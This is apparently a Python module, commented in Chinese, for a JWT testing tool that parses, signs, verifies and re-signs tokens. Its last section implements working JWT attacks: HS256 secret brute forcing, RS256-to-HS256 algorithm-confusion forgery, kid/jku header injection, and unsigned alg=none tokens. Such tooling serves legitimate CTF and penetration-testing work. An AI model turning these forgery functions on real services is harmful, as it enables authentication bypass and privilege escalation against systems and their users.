# -*- coding: utf-8 -*-
from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field


class JwtError(ValueError):
    """JWT 模块的统一异常，界面层捕获后展示中文原因。"""


# ---------------------------------------------------------------------------
# 一、算法常量
# ---------------------------------------------------------------------------
ALG_NONE = "none"

#: HMAC 系列（密钥为任意字符串，走标准库 hmac）
HS_ALGORITHMS = ("HS256", "HS384", "HS512")
#: RSA + PKCS1v15 系列（密钥为 PEM 文本）
RS_ALGORITHMS = ("RS256", "RS384", "RS512")
#: ECDSA 系列（密钥为 PEM 文本，签名为裸 R||S）
ES_ALGORITHMS = ("ES256", "ES384", "ES512")

#: 全部可选算法（顺序即界面下拉顺序）
ALL_ALGORITHMS = HS_ALGORITHMS + RS_ALGORITHMS + ES_ALGORITHMS + (ALG_NONE,)

#: 算法显示名（界面下拉用）
ALGORITHM_LABELS = {
    "HS256": "HS256（HMAC-SHA256，字符串密钥）",
    "HS384": "HS384（HMAC-SHA384，字符串密钥）",
    "HS512": "HS512（HMAC-SHA512，字符串密钥）",
    "RS256": "RS256（RSA-SHA256，PEM 密钥）",
    "RS384": "RS384（RSA-SHA384，PEM 密钥）",
    "RS512": "RS512（RSA-SHA512，PEM 密钥）",
    "ES256": "ES256（ECDSA P-256，PEM 密钥）",
    "ES384": "ES384（ECDSA P-384，PEM 密钥）",
    "ES512": "ES512（ECDSA P-521，PEM 密钥）",
    "none": "none（无签名，仅用于测试 / CTF）",
}

#: HMAC 各算法对应的摘要函数
_HS_DIGESTS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
               "HS512": hashlib.sha512}
#: RSA 各算法对应的 cryptography 摘要算法实例工厂
_RS_DIGESTS = {"RS256": "sha256", "RS384": "sha384", "RS512": "sha512"}
#: ECDSA 各算法 -> (曲线, 摘要, 半签名长度字节数)
#:
#: ES256 用 P-256（签名 R/S 各 32 字节）、ES384 用 P-384（各 48 字节）、
#: ES512 用 P-521（各 66 字节，注意不是 512//8=64）。
_ES_CURVES = None  # 延迟导入 cryptography 后填充，见 _es_curve_table()

#: JWT 标准注册声明名（界面「常用声明」快捷填充用）
STANDARD_CLAIMS = ("iss", "sub", "aud", "exp", "iat", "nbf", "jti")

#: 常见声明与 header 字段的中文说明（解析页展示用）
CLAIM_DESCRIPTIONS = {
    "alg": "签名算法",
    "typ": "令牌类型",
    "kid": "密钥标识",
    "iss": "签发者",
    "sub": "主题",
    "aud": "受众",
    "exp": "过期时间（Unix 秒）",
    "iat": "签发时间（Unix 秒）",
    "nbf": "生效时间（Unix 秒）",
    "jti": "令牌唯一标识",
}


# ---------------------------------------------------------------------------
# 二、Base64URL 编解码
# ---------------------------------------------------------------------------
def b64url_encode(data: bytes) -> str:
    """Base64URL 编码（无填充，``+``/``/`` 换成 ``-``/``_``）。"""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(text: str) -> bytes:
    """Base64URL 解码；容忍缺失填充与混入的 ``+``/``/``。

    非法字符或解码失败时抛 :class:`JwtError`。
    """
    if text is None:
        raise JwtError("Base64URL 解码失败：内容为空。")
    # 容错：把可能混入的标准 base64 字符换回 URL 安全字符
    cleaned = str(text).strip().replace("-", "+").replace("_", "/")
    padding = "=" * (-len(cleaned) % 4)
    try:
        return base64.b64decode(cleaned + padding, validate=True)
    except (binascii.Error, ValueError) as exc:
        raise JwtError(f"Base64URL 解码失败：{exc}") from exc


# ---------------------------------------------------------------------------
# 三、JSON 辅助
# ---------------------------------------------------------------------------
def _compact_json(obj) -> bytes:
    """把对象序列化为紧凑 JSON 字节（JWT 规范要求无多余空白）。"""
    return json.dumps(obj, ensure_ascii=False, separators=(",", ":")).encode("utf-8")


def pretty(obj) -> str:
    """把对象美化为缩进 JSON 文本（界面展示用，中文不转义）。"""
    return json.dumps(obj, ensure_ascii=False, indent=2)


# ---------------------------------------------------------------------------
# 四、解析
# ---------------------------------------------------------------------------
@dataclass
class JwtInfo:
    """解析结果：三段原文 + 解出的 header / payload + 签名字节。"""

    header: dict
    payload: dict
    signature: bytes
    header_raw: str
    payload_raw: str
    signature_raw: str
    algorithm: str = ""
    #: header 里除 ``alg`` 外的字段（保留原始顺序）
    extra: dict = field(default_factory=dict)

    @property
    def signing_input(self) -> bytes:
        """签名原文：``base64url(header).base64url(payload)`` 的字节。"""
        return f"{self.header_raw}.{self.payload_raw}".encode("ascii")

    @property
    def has_signature(self) -> bool:
        """第三段是否有实际签名内容。"""
        return bool(self.signature)

    def header_json(self) -> str:
        return pretty(self.header)

    def payload_json(self) -> str:
        return pretty(self.payload)


def _decode_segment(segment: str, position: int, what: str) -> dict:
    """解码 JWT 的第 1 / 2 段为 dict；非法时抛带定位信息的 :class:`JwtError`。"""
    if not segment:
        raise JwtError(f"JWT 解析失败：第 {position} 段（{what}）为空，无法解码。")
    raw = b64url_decode(segment)
    try:
        text = raw.decode("utf-8")
    except UnicodeDecodeError as exc:
        raise JwtError(
            f"JWT 解析失败：第 {position} 段（{what}）解码后不是合法 UTF-8（{exc}）。"
        ) from exc
    try:
        obj = json.loads(text)
    except json.JSONDecodeError as exc:
        raise JwtError(
            f"JWT 解析失败：第 {position} 段（{what}）不是合法 JSON"
            f"（第 {exc.lineno} 行第 {exc.colno} 列：{exc.msg}）。"
        ) from exc
    if not isinstance(obj, dict):
        raise JwtError(
            f"JWT 解析失败：第 {position} 段（{what}）解码后是 "
            f"{type(obj).__name__}，应为 JSON 对象。"
        )
    return obj


def parse(token: str) -> JwtInfo:
    """解析 JWT（**不校验签名**），返回 :class:`JwtInfo`。

    支持标准三段 ``header.payload.signature``；``alg=none`` 的令牌第三段可为空。
    若出现 5 段则是 JWE（加密令牌），本模块不支持，抛 :class:`JwtError`。
    """
    text = str(token or "").strip().strip('"')
    # 允许粘贴时带 Bearer 前缀
    if text.lower().startswith("bearer "):
        text = text[7:].strip()
    if not text:
        raise JwtError("JWT 解析失败：内容为空。")

    parts = text.split(".")
    if len(parts) == 5:
        raise JwtError(
            "该令牌是 JWE（5 段加密令牌），本工具仅支持 JWS（3 段签名令牌）。")
    if len(parts) != 3:
        raise JwtError(
            "JWT 解析失败：JWS 应由 3 段（header.payload.signature）以「.」连接，"
            f"当前为 {len(parts)} 段。")

    header = _decode_segment(parts[0], 1, "Header")
    payload = _decode_segment(parts[1], 2, "Payload")

    signature = b64url_decode(parts[2]) if parts[2] else b""
    algorithm = str(header.get("alg", "") or "")
    extra = {k: v for k, v in header.items() if k != "alg"}

    return JwtInfo(
        header=header, payload=payload, signature=signature,
        header_raw=parts[0], payload_raw=parts[1], signature_raw=parts[2],
        algorithm=algorithm, extra=extra,
    )


# ---------------------------------------------------------------------------
# 五、签名与校验
# ---------------------------------------------------------------------------
def _hash_alg(name: str):
    """把 ``sha256`` / ``sha384`` / ``sha512`` 转成 cryptography 摘要实例。"""
    from cryptography.hazmat.primitives import hashes

    return {"sha256": hashes.SHA256, "sha384": hashes.SHA384,
            "sha512": hashes.SHA512}[name]()


def _es_curve_table():
    """延迟加载 ECDSA 曲线表（避免顶层 import cryptography 的开销）。"""
    global _ES_CURVES
    if _ES_CURVES is None:
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import ec

        _ES_CURVES = {
            "ES256": (ec.SECP256R1(), hashes.SHA256(), 32),
            "ES384": (ec.SECP384R1(), hashes.SHA384(), 48),
            "ES512": (ec.SECP521R1(), hashes.SHA512(), 66),
        }
    return _ES_CURVES


def _require_key(algorithm: str, key) -> bytes:
    """校验密钥可用性并转为字节；HMAC 允许任意字符串，非对称要求 PEM 文本。"""
    if algorithm in HS_ALGORITHMS:
        if key is None or str(key).strip() == "":
            raise JwtError(f"{algorithm} 需要一个 HMAC 密钥（任意字符串）。")
        return str(key).encode("utf-8")

    # 非对称：key 应为 PEM 文本
    if key is None or not str(key).strip():
        raise JwtError(f"{algorithm} 需要 PEM 格式的密钥文本。")
    pem = str(key).encode("utf-8")
    if b"-----BEGIN" not in pem:
        raise JwtError(
            f"{algorithm} 需要 PEM 格式密钥（含 -----BEGIN ... ----- 行），"
            "当前内容不像 PEM。")
    return pem


def _load_private(pem: bytes, algorithm: str):
    """加载 PEM 私钥；失败抛 :class:`JwtError`。"""
    from cryptography.hazmat.primitives.serialization import load_pem_private_key

    try:
        return load_pem_private_key(pem, password=None)
    except Exception as exc:  # noqa: BLE001  cryptography 异常族繁杂，统一兜底
        raise JwtError(
            f"{algorithm} 私钥加载失败：{exc}。请确认是 PEM 格式私钥且未加密。"
        ) from exc


def _load_public(pem: bytes, algorithm: str):
    """加载 PEM 公钥；失败时回退尝试「私钥 PEM」并取出其公钥。

    CTF 场景常直接粘贴私钥来验签，这里容错处理，最后都失败才抛
    :class:`JwtError`。
    """
    from cryptography.hazmat.primitives.serialization import (
        load_pem_private_key,
        load_pem_public_key,
    )

    try:
        return load_pem_public_key(pem)
    except Exception:  # noqa: BLE001  尝试回退，异常细节暂不暴露
        pass

    try:
        priv = load_pem_private_key(pem, password=None)
        return priv.public_key()
    except Exception as exc:  # noqa: BLE001
        raise JwtError(
            f"{algorithm} 公钥加载失败：{exc}。请确认是 PEM 格式公钥（或私钥）。"
        ) from exc


def _der_to_raw(der: bytes, half: int) -> bytes:
    """DER 签名 -> JWT 需要的裸 ``R||S``（各 ``half`` 字节，左侧补零）。"""
    from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

    r, s = decode_dss_signature(der)
    return r.to_bytes(half, "big") + s.to_bytes(half, "big")


def _raw_to_der(raw: bytes, half: int) -> bytes:
    """JWT 的裸 ``R||S`` 签名 -> DER（供 cryptography 验签）。"""
    from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature

    if len(raw) != half * 2:
        raise JwtError(
            f"ES 签名长度异常：应为 {half * 2} 字节，实际 {len(raw)} 字节。")
    r = int.from_bytes(raw[:half], "big")
    s = int.from_bytes(raw[half:], "big")
    return encode_dss_signature(r, s)


def sign(algorithm: str, signing_input: bytes, key) -> bytes:
    """对 ``signing_input`` 按 ``algorithm`` 签名，返回签名字节。

    ``none`` 返回空字节；HMAC 系列用字符串密钥；RSA / ECDSA 系列用 PEM 私钥。
    """
    algorithm = str(algorithm or "").strip()
    if algorithm == ALG_NONE:
        return b""

    if algorithm in HS_ALGORITHMS:
        secret = _require_key(algorithm, key)
        return hmac.new(secret, signing_input, _HS_DIGESTS[algorithm]).digest()

    if algorithm in RS_ALGORITHMS:
        from cryptography.hazmat.primitives.asymmetric import padding

        pem = _require_key(algorithm, key)
        private = _load_private(pem, algorithm)
        return private.sign(
            signing_input, padding.PKCS1v15(), _hash_alg(_RS_DIGESTS[algorithm]))

    if algorithm in ES_ALGORITHMS:
        from cryptography.hazmat.primitives.asymmetric import ec

        pem = _require_key(algorithm, key)
        curve, digest, half = _es_curve_table()[algorithm]
        private = _load_private(pem, algorithm)
        if getattr(private, "curve", None) is None \
                or private.curve.name != curve.name:
            raise JwtError(
                f"{algorithm} 需要 {curve.name} 曲线的私钥，"
                f"当前密钥曲线为 "
                f"{getattr(getattr(private, 'curve', None), 'name', '未知')}，"
                "曲线与算法不匹配。")
        der = private.sign(signing_input, ec.ECDSA(digest))
        return _der_to_raw(der, half)

    raise JwtError(
        f"不支持的签名算法：{algorithm}。可选：{'、'.join(ALL_ALGORITHMS)}。")


def verify(token: str, key) -> bool:
    """用 ``key`` 校验 JWT 签名，返回 ``True`` / ``False``。

    ``alg=none`` 的令牌仅当第三段为空时算通过（与「未签名」语义一致）。
    密钥格式错误（如该 PEM 却给了普通字符串）抛 :class:`JwtError`；签名不匹配
    或摘要不符只返回 ``False``，不抛异常。
    """
    info = parse(token)
    algorithm = info.algorithm
    if not algorithm:
        raise JwtError("该令牌 Header 缺少 alg 字段，无法校验签名。")

    if algorithm == ALG_NONE:
        return not info.has_signature

    signing_input = info.signing_input

    if algorithm in HS_ALGORITHMS:
        secret = _require_key(algorithm, key)
        expected = hmac.new(secret, signing_input, _HS_DIGESTS[algorithm]).digest()
        return hmac.compare_digest(expected, info.signature)

    if algorithm in RS_ALGORITHMS:
        from cryptography.exceptions import InvalidSignature
        from cryptography.hazmat.primitives.asymmetric import padding

        pem = _require_key(algorithm, key)
        public = _load_public(pem, algorithm)
        try:
            public.verify(info.signature, signing_input,
                          padding.PKCS1v15(), _hash_alg(_RS_DIGESTS[algorithm]))
            return True
        except InvalidSignature:
            return False

    if algorithm in ES_ALGORITHMS:
        from cryptography.exceptions import InvalidSignature
        from cryptography.hazmat.primitives.asymmetric import ec

        pem = _require_key(algorithm, key)
        curve, digest, half = _es_curve_table()[algorithm]
        public = _load_public(pem, algorithm)
        if getattr(public, "curve", None) is None \
                or public.curve.name != curve.name:
            raise JwtError(
                f"{algorithm} 需要 {curve.name} 曲线的公钥，"
                f"当前密钥曲线为 "
                f"{getattr(getattr(public, 'curve', None), 'name', '未知')}，"
                "曲线与算法不匹配。")
        try:
            der = _raw_to_der(info.signature, half)
        except JwtError:
            return False  # 长度不对 -> 签名必错，直接判否
        try:
            public.verify(der, info.signing_input, ec.ECDSA(digest))
            return True
        except InvalidSignature:
            return False

    raise JwtError(
        f"不支持的校验算法：{algorithm}。可选：{'、'.join(ALL_ALGORITHMS)}。")


# ---------------------------------------------------------------------------
# 六、创建
# ---------------------------------------------------------------------------
def create(header: dict, payload: dict, key=None, algorithm: str = "HS256") -> str:
    """按给定 header / payload / 密钥 / 算法创建并签名一个 JWT。

    ``header`` 里的 ``alg`` 会被 ``algorithm`` 覆盖以保持一致；``typ`` 缺省补
    ``JWT``。``algorithm`` 为 ``none`` 时不签名，产出 ``header.payload.`` 形式
    （第三段为空，便于 alg:none 攻击复现）。
    """
    algorithm = str(algorithm or "").strip()
    if algorithm not in ALL_ALGORITHMS:
        raise JwtError(
            f"不支持的签名算法：{algorithm}。可选：{'、'.join(ALL_ALGORITHMS)}。")

    head = dict(header) if header else {}
    payload_obj = dict(payload) if payload else {}
    head["alg"] = algorithm
    head.setdefault("typ", "JWT")

    header_raw = b64url_encode(_compact_json(head))
    payload_raw = b64url_encode(_compact_json(payload_obj))
    signing_input = f"{header_raw}.{payload_raw}".encode("ascii")

    signature = sign(algorithm, signing_input, key)
    signature_raw = b64url_encode(signature)
    return f"{header_raw}.{payload_raw}.{signature_raw}"


def resign(token: str, key=None, algorithm: str | None = None) -> str:
    """重签一个已解析的令牌：保留原 header / payload，换算法（可选）后重新签名。

    ``algorithm`` 为 ``None`` 时沿用原令牌 Header 里的 ``alg``。这是「修改后重签」
    的核心——界面层改完声明调它即可。
    """
    info = parse(token)
    target = algorithm if algorithm is not None else info.algorithm
    return create(info.header, info.payload, key, target)


def now_timestamp() -> int:
    """当前 Unix 秒（界面填充 ``iat`` / ``exp`` 用）。"""
    return int(time.time())


def coerce_claim_value(text: str):
    """把界面输入的声明值转成合适的 JSON 类型。

    规则：``true``/``false`` -> 布尔；纯整数 -> ``int``；合法 JSON（对象 / 数组 /
    带引号字符串等）-> 解析结果；其余按字符串保留。这让用户在创建 / 修改页直接
    填 ``exp`` 的时间戳、``admin`` 的 ``true`` 而不会变成字符串。
    """
    raw = str(text)
    stripped = raw.strip()
    low = stripped.lower()
    if low == "true":
        return True
    if low == "false":
        return False
    if low == "null":
        return None
    # 整数（含负号），避免把 "007" 之类误转，但纯数字时间戳需要转
    if stripped and (stripped.isdigit()
                     or (stripped[0] == "-" and stripped[1:].isdigit())):
        try:
            return int(stripped)
        except ValueError:
            pass
    # 尝试解析为 JSON（覆盖 {"a":1}、[1,2]、"带引号的串"）
    if stripped[:1] in "{[\"":
        try:
            return json.loads(stripped)
        except json.JSONDecodeError:
            pass
    return raw


# ---------------------------------------------------------------------------
# 七、JWT 攻击增强（HS256 爆破 / RS256→HS256 混淆 / kid·jku 注入）
# ---------------------------------------------------------------------------
def hs_bruteforce(token: str, candidates, log=None, stop=None) -> str | None:
    """HS256 弱密钥爆破：遍历候选密钥，用 HMAC 验签找到正确密钥。

    参数
    ----
    token      目标 JWT（需为 HS 系列算法）
    candidates 候选密钥列表（字符串序列；由界面层从字典 / 候选输入池提供）
    log        逐条日志回调 ``(msg)``
    stop       ``threading.Event``，置位后提前结束

    返回
    ----
    命中的密钥字符串；未命中返回 ``None``。令牌非 HS 系列、解析失败时抛
    :class:`JwtError`。
    """
    info = parse(token)
    algorithm = info.algorithm
    if algorithm not in HS_ALGORITHMS:
        raise JwtError(
            f"HS256 爆破仅适用于 HS 系列令牌，当前算法为 {algorithm or '未标注'}。"
            "如需爆破其它算法，请先确认令牌签名方式。")

    emit = log or (lambda _msg: None)
    signing_input = info.signing_input
    target_sig = info.signature
    if not target_sig:
        raise JwtError("该令牌没有签名段，无法爆破密钥。")

    tried = 0
    for candidate in candidates:
        if stop is not None and stop.is_set():
            emit("已手动停止。")
            break
        secret = str(candidate).encode("utf-8")
        tried += 1
        expected = hmac.new(secret, signing_input, _HS_DIGESTS[algorithm]).digest()
        if hmac.compare_digest(expected, target_sig):
            emit(f"命中：密钥 = {candidate}")
            return str(candidate)
        if tried % 200 == 0:
            emit(f"已尝试 {tried} 个候选，当前：{candidate}")

    emit(f"未命中：共尝试 {tried} 个候选密钥。")
    return None


def alg_confusion_rs_to_hs(payload: dict, public_key_pem: str,
                           hs_alg: str = "HS256") -> str:
    """RS256→HS256 算法混淆攻击：构造 ``alg=HS256`` 的伪造令牌。

    原理：服务端若用 RSA 公钥验签，却未严格区分算法类型，攻击者把 ``alg``
    改成 ``HS256``，并把**公钥 PEM 文本当作 HMAC 密钥**对消息签名。服务端若
    按 HS256 处理、用同一段公钥 PEM 字符串做 HMAC 密钥验签，即可通过。

    参数
    ----
    payload        要伪造的 Payload（如 ``{"role": "admin"}``）
    public_key_pem 服务端的 RSA 公钥 PEM 文本（会被当作 HMAC 密钥）
    hs_alg         HS 系列算法（默认 ``HS256``）

    返回
    ----
    伪造的 JWT（``alg=hs_alg``，签名密钥 = 公钥 PEM 文本）。
    """
    hs_alg = str(hs_alg or "HS256").strip()
    if hs_alg not in HS_ALGORITHMS:
        raise JwtError(f"算法混淆的伪造算法必须是 HS 系列，当前为 {hs_alg!r}。")
    # 注意：公钥 PEM 会被当作 HMAC 密钥，必须**原样**使用（含末尾换行），
    # 才能与服务端拿同一段 PEM 文本做 HMAC 验签时保持一致。
    pem = str(public_key_pem or "")
    if not pem.strip() or "-----BEGIN" not in pem:
        raise JwtError("RS256→HS256 混淆需要 RSA 公钥 PEM（含 -----BEGIN ... -----）。")
    return create({"alg": hs_alg, "typ": "JWT"}, payload, pem, hs_alg)


def inject_header(token: str, extra_header: dict, key=None,
                  algorithm: str | None = None) -> str:
    """注入 header 字段（如 ``kid`` / ``jku``）并重签，返回新令牌。

    用于 kid / jku 注入攻击：向 Header 注入攻击者控制的 ``kid``（密钥标识）
    或 ``jku``（JWK Set URL）字段，引导服务端加载攻击者指定的密钥 / 密钥集。

    参数
    ----
    token         原令牌（保留其 Payload）
    extra_header  要注入的 header 字段（如 ``{"kid": "attacker", "jku": "https://..."}``）
    key           重签密钥（缺省沿用原算法时需要；指定 algorithm 时按新算法提供）
    algorithm     重签算法（None 沿用原令牌算法）

    返回
    ----
    注入 header 后重签的新 JWT。
    """
    info = parse(token)
    head = dict(info.header)
    head.update(dict(extra_header or {}))
    target = algorithm if algorithm is not None else info.algorithm
    return create(head, info.payload, key, target)
